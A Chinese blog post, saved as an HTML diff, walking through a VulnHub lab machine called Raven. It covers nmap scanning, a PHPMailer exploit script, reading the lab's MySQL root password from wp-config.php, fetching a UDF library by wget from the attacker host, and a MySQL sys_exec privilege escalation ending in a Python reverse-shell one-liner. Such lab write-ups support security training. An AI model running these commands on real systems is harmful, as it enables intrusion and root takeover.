@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Raven | mrfan6の博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="vulnhub靶机Raven主机发现1nmap -sn 192.168.8.0&#x2F;24   端口扫描1nmap -sS -p- 192.168.8.10   获取端口服务信息12345# -sC: 服务扫描,等价于 --script&#x3D;default，使用默认类别的脚本进行扫描。# -A ：选项用于使用进攻性方式扫描# -sV: 指定让Nmap进行服务版本扫描# -oA:保存文件nmap -sC -s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Raven">
+<meta property="og:url" content="https://mrfan6.github.io/2022/08/30/Raven/index.html">
+<meta property="og:site_name" content="mrfan6の博客">
+<meta property="og:description" content="vulnhub靶机Raven主机发现1nmap -sn 192.168.8.0&#x2F;24   端口扫描1nmap -sS -p- 192.168.8.10   获取端口服务信息12345# -sC: 服务扫描,等价于 --script&#x3D;default，使用默认类别的脚本进行扫描。# -A ：选项用于使用进攻性方式扫描# -sV: 指定让Nmap进行服务版本扫描# -oA:保存文件nmap -sC -s">
+<meta property="og:locale">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220829101409344.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220829101438014.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220829101738291.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830084915823.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830085114631.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830085155654.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830085312655.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830085406517.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830085947034.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830090020594.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830090122522.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830090202242.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830092225600.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830091021307.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830091708629.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830093344275.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830091909798.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830092007038.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830092056275.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830093608134.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830093730208.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830094019971.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830094520701.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830095105657.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830095536271.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830100343054.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830101718434.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830191902334.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830192616369.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830193444577.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830195601137-16618606068252.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830195830846.png">
+<meta property="article:published_time" content="2022-08-29T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-30T12:13:21.292Z">
+<meta property="article:author" content="mrfan6">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220829101409344.png">
+  
+    <link rel="alternative" href="/atom.xml" title="mrfan6の博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate"></a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                            <li><a href="/HTML/index.html">火影忍者</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="#" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                            
+                                <a class="fl QQ" target="_blank" href="#" title="QQ">QQ</a>
+                            
+                                <a class="fl wechat" target="_blank" href="#" title="wechat">wechat</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Web安全</a> <a href="/tags/tools/" style="font-size: 15px;">tools</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">编程</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 20px;">靶场</a> <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 10px;">靶机</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://mrfan6.github.io/">mrfan6</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱运动、喜欢接触新鲜事物、迎接新的挑战，更爱游离于错综复杂的编码与逻辑中</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>            
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                    <li><a href="/HTML/index.html">火影忍者</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="#" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                    
+                        <a class="QQ" target="_blank" href="#" title="QQ">QQ</a>
+                    
+                        <a class="wechat" target="_blank" href="#" title="wechat">wechat</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-Raven" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/08/30/Raven/" class="article-date">
+      <time datetime="2022-08-29T16:00:00.000Z" itemprop="datePublished">2022-08-30</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Raven
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+	<div class="article-entry" itemprop="articleBody">
+	      
+	        
+	            
+	        
+	        
+	        <h1 id="vulnhub靶机Raven"><a href="#vulnhub靶机Raven" class="headerlink" title="vulnhub靶机Raven"></a>vulnhub靶机Raven</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.8.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220829101409344.png" alt="image-20220829101409344"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- 192.168.8.10</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220829101438014.png" alt="image-20220829101438014"></p>
+<h3 id="获取端口服务信息"><a href="#获取端口服务信息" class="headerlink" title="获取端口服务信息"></a>获取端口服务信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># -sC: 服务扫描,等价于 --script=default，使用默认类别的脚本进行扫描。</span><br><span class="line"># -A ：选项用于使用进攻性方式扫描</span><br><span class="line"># -sV: 指定让Nmap进行服务版本扫描</span><br><span class="line"># -oA:保存文件</span><br><span class="line">nmap -sC -sV -A -p 22,80,111,55054 192.168.8.10 -oA nmapfile </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220829101738291.png" alt="image-20220829101738291"></p>
+<h3 id="美化nmap扫描结果"><a href="#美化nmap扫描结果" class="headerlink" title="美化nmap扫描结果"></a>美化nmap扫描结果</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xsltproc -o nmapfile.html model.xsl nmapfile.xml  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830084915823.png" alt="image-20220830084915823"></p>
+<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>通过浏览80端口页面,发现该站点是WordPress站点</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830085114631.png" alt="image-20220830085114631"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830085155654.png" alt="image-20220830085155654"></p>
+<p>通过该搜索栏发现跳转到<a target="_blank" rel="noopener" href="http://raven.local/%E7%AB%99%E7%82%B9">http://raven.local/站点</a> 此时猜测需要绑定hosts</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830085312655.png" alt="image-20220830085312655"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830085406517.png" alt="image-20220830085406517"></p>
+<p>可以进入后台 但经过暴力破解依然无效 此时换条思路 因为getshell是需要进入后台才可以的</p>
+<p>进行dirsearch扫描</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830085947034.png" alt="image-20220830085947034"></p>
+<h3 id="phpmailer-Getshell"><a href="#phpmailer-Getshell" class="headerlink" title="phpmailer-Getshell"></a>phpmailer-Getshell</h3><h4 id="phpmailer基本信息"><a href="#phpmailer基本信息" class="headerlink" title="phpmailer基本信息"></a>phpmailer基本信息</h4><p>这里可以发现vendor目录并进行访问</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830090020594.png" alt="image-20220830090020594"></p>
+<p>可以发现一个phpmailer的字眼以及VERSION版本信息、PATH路径</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830090122522.png" alt="image-20220830090122522"></p>
+<p>通过查询可以知道这是一个发电子邮件用的php函数包</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830090202242.png" alt="image-20220830090202242"></p>
+<p>以及这里有个版本是5.2.16，联系上下可以猜测这应该就是phpmailer的版本号</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830092225600.png" alt="image-20220830092225600"></p>
+<p>还可以知道路径是/var/www/html/</p>
+<h4 id="phpmailer漏洞利用"><a href="#phpmailer漏洞利用" class="headerlink" title="phpmailer漏洞利用"></a>phpmailer漏洞利用</h4><p>此时可以查询phpmailer已知的漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit phpmailer</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830091021307.png" alt="image-20220830091021307"></p>
+<p>从中选一个py脚本（/usr/share/exploitdb/exploits/php/webapps/40974.py）</p>
+<p>修改里面的target与反弹ip还有路径</p>
+<p>由于这是一个phpmailer的漏洞,也就是说target是网站的相关邮件页面</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830091708629.png" alt="image-20220830091708629"></p>
+<p>也就是<a target="_blank" rel="noopener" href="http://raven.local/contact.php%EF%BC%8C%E6%8E%A5%E7%9D%80%E4%BF%AE%E6%94%B9%E5%8F%8D%E5%BC%B9IP%E4%BB%A5%E5%8F%8Apath%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BF%AE%E6%94%B9%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6">http://raven.local/contact.php，接着修改反弹IP以及path也可以修改后门文件</a></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830093344275.png" alt="image-20220830093344275"></p>
+<p>运行该利用脚本</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830091909798.png" alt="image-20220830091909798"></p>
+<p>监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<p>接着打开<a target="_blank" rel="noopener" href="http://raven.local/contact.php%E9%A1%B5%E9%9D%A2%EF%BC%8C%E7%AD%89%E4%BB%96%E5%8A%A0%E8%BD%BD%E5%AE%8C%E5%90%8E%E5%86%8D%E6%89%93%E5%BC%80http://raven.local/mrfan.php%E9%A1%B5%E9%9D%A2">http://raven.local/contact.php页面，等他加载完后再打开http://raven.local/mrfan.php页面</a></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830092007038.png" alt="image-20220830092007038"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830092056275.png" alt="image-20220830092056275"></p>
+<p>此时可以打开<a target="_blank" rel="noopener" href="http://raven.local/mrfan.php%E9%A1%B5%E9%9D%A2%E4%BA%86">http://raven.local/mrfan.php页面了</a></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830093608134.png" alt="image-20220830093608134"></p>
+<p>成功反弹</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830093730208.png" alt="image-20220830093730208"></p>
+<p>是www-data用户还需要进行提取操作</p>
+<h3 id="创建交互式"><a href="#创建交互式" class="headerlink" title="创建交互式"></a>创建交互式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830094019971.png" alt="image-20220830094019971"></p>
+<h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>查看可以看到mysql进程 还是以root权限进行的</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830094520701.png" alt="image-20220830094520701"></p>
+<h4 id="获取mysql数据库密码"><a href="#获取mysql数据库密码" class="headerlink" title="获取mysql数据库密码"></a>获取mysql数据库密码</h4><p>我们可以查看相关配置连接文件获取数据库密码</p>
+<p>可以在/var/www/html/wordpress/wp-config.php发现数据库密码</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830095105657.png" alt="image-20220830095105657"></p>
+<p>此时若该数据库有写的权限 那就可以开始尝试udf提权了</p>
+<h4 id="查看mysql是否具备写权限"><a href="#查看mysql是否具备写权限" class="headerlink" title="查看mysql是否具备写权限"></a>查看mysql是否具备写权限</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 进入数据库</span><br><span class="line">mysql -uroot -pR@v3nSecurity</span><br><span class="line"></span><br><span class="line"># 查看是否具有可写权限</span><br><span class="line">show global variables like &#x27;secure%&#x27;; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830095536271.png" alt="image-20220830095536271"></p>
+<p>可以发现没值是可以进行读写文件的</p>
+<h4 id="获取mysql安装路径"><a href="#获取mysql安装路径" class="headerlink" title="获取mysql安装路径"></a>获取mysql安装路径</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查看mysql的安装路径（绝对路径）</span><br><span class="line">select @@basedir;</span><br><span class="line"></span><br><span class="line"># 查看版本 </span><br><span class="line"># windows中，对于mysql小于5.1的，导出目录为C:\Windows\或C:\Windows\System32\，linux中，5.1以上lib\plugin</span><br><span class="line">select @@version；</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830100343054.png" alt="image-20220830100343054"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830101718434.png" alt="image-20220830101718434"></p>
+<p>结合上述信息可以知道安装的路径应该在 <strong>/usr/lib/mysql/plugin/</strong></p>
+<h4 id="查看mysql编译版本"><a href="#查看mysql编译版本" class="headerlink" title="查看mysql编译版本"></a>查看mysql编译版本</h4><p>查看主机架构，以便确认操作系统位数，使用不同的udf.dll脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%compile%&#x27;; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830191902334.png" alt="image-20220830191902334"></p>
+<p>这里可以看到可以使用64或者32位的</p>
+<h4 id="获取udf的动态链接库并上传"><a href="#获取udf的动态链接库并上传" class="headerlink" title="获取udf的动态链接库并上传"></a>获取udf的动态链接库并上传</h4><p>定位动态链接库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate metasploit-framework|grep data/exploits/mysql</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830192616369.png" alt="image-20220830192616369"></p>
+<p>系统环境是Linux所以采用so(/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so)</p>
+<p>上传该链接库到靶场上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.8.3/lib_mysqludf_sys_64.so -O /tmp/lib_mysqludf_sys_64.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830193444577.png" alt="image-20220830193444577"></p>
+<h4 id="导入udf文件并创建自定义函数"><a href="#导入udf文件并创建自定义函数" class="headerlink" title="导入udf文件并创建自定义函数"></a>导入udf文件并创建自定义函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pR@v3nSecurity</span><br><span class="line">use mysql;   # 切换数据库</span><br><span class="line">create table foo(line blob); # 新建一个表，用来存放本地传来的udf文件的内容</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/lib_mysqludf_sys_64.so&#x27;)); # 在foo中写入udf文件内容</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so&#x27;;  将udf文件内容传入新建的udf文件中</span><br><span class="line">create function sys_exec returns integer soname &#x27;lib_mysqludf_sys_64.so&#x27;; # 导入udf函数 sys_exec</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830195601137-16618606068252.png"></p>
+<h4 id="利用自定义函数反弹shell"><a href="#利用自定义函数反弹shell" class="headerlink" title="利用自定义函数反弹shell"></a>利用自定义函数反弹shell</h4><p>调用自定义函数反弹shell 并监听8888端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_exec(&#x27;python -c \&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.8.3&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)\&#x27;&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20220830195830846.png" alt="image-20220830195830846"></p>
+<p>成功提权root用户 </p>
+
+	        
+	      
+	    </div>
+	    
+	  </div>
+	  
+	    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/08/30/Raven/">Raven</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问  的个人博客"></a></p>
+        <p><span>发布时间:</span>2022年08月30日 - 00时00分</p>
+        <p><span>最后更新:</span>2022年08月30日 - 20时13分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/08/30/Raven/" title="Raven">https://mrfan6.github.io/2022/08/30/Raven/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://mrfan6.github.io/2022/08/30/Raven/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2022/08/28/vulnhub%E9%9D%B6%E6%9C%BALampiao/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Lampiao</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+	  
+	</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub%E9%9D%B6%E6%9C%BARaven"><span class="toc-number">1.</span> <span class="toc-text">vulnhub靶机Raven</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.1.</span> <span class="toc-text">获取端口服务信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BE%8E%E5%8C%96nmap%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C"><span class="toc-number">1.2.2.</span> <span class="toc-text">美化nmap扫描结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞探测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpmailer-Getshell"><span class="toc-number">1.3.1.</span> <span class="toc-text">phpmailer-Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#phpmailer%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">phpmailer基本信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phpmailer%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">phpmailer漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%BA%A4%E4%BA%92%E5%BC%8F"><span class="toc-number">1.3.2.</span> <span class="toc-text">创建交互式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.3.</span> <span class="toc-text">udf提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 